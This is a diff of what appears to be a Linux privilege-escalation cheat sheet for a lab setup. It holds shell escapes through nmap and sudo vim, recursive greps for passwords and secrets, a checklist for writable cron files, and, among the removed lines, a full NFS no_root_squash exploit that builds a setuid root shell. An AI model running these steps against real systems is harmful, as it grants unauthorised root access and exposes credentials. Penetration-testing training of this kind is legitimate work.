@@ -290,19 +290,6 @@ Nmap example
 Nmap: $ nmap --interactive 
 nmap> !sh
 ~~~
-# Search and grep for keywords in all files.
-~~~
-1. cat ~/.bash_history 
-2. cd ~ 
-3. grep -Eir "password|secret|sudo|<username>" * | less 
-4. cd /etc 
-5. grep -Eir "password|secret|sudo|<username>" * | less 
-6. cd /home 
-7. grep -Eir "password|secret|sudo|<username>" * | less 
-8. cd /var/www 
-9. grep -Eir "password|secret|sudo|<username>" * | less 
-10. find . -type f | xargs grep <SEARCHTERM>
-~~~
 # Sudo shell escapes.
 ~~~~~~
 sudo -l 
@@ -320,27 +307,8 @@ sudo vim -c '!sh'
   - nmap 
   - vim 
 ~~~
-# If you have any of those proceed to exploit.
+# cron schedule
 ~~~
-1. cat /etc/exports 
-2. If “no_root_squash” option is defined for the “/tmp” export (or another export), use this method 
-~~~
-Exploitation  
-Kali VM  
-1. Open command prompt and type: showmount -e [Linux VM IP Address]  
-2. In command prompt type: mkdir /tmp/1  
-3. In command prompt type: mount -o rw,vers=2 [Linux VM IP Address]:/tmp /tmp/1  
-In command prompt type: echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c  
-4. In command prompt type: gcc /tmp/1/x.c -o /tmp/1/x  
-5. In command prompt type: chmod +s /tmp/1/x  
-Linux VM  
-1. In command prompt type: /tmp/x  
-2. In command prompt type: id 
-
-# Exploit misconfigured vulnerable NFS.
-~~~
-http://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
-=======================
 s -aRl /etc/cron* | awk '$1 ~ /w.$/' 2>/dev/null 
 cron.d 
 cron.daily 
@@ -363,8 +331,6 @@ Linux VM
 3. Wait 1 minute for the Bash script to execute.  
 4. In command prompt type: /tmp/bash -p  
 5. In command prompt type: id 
-~~~
-# Cron job tests
 ~~~
 Linux VM  
 
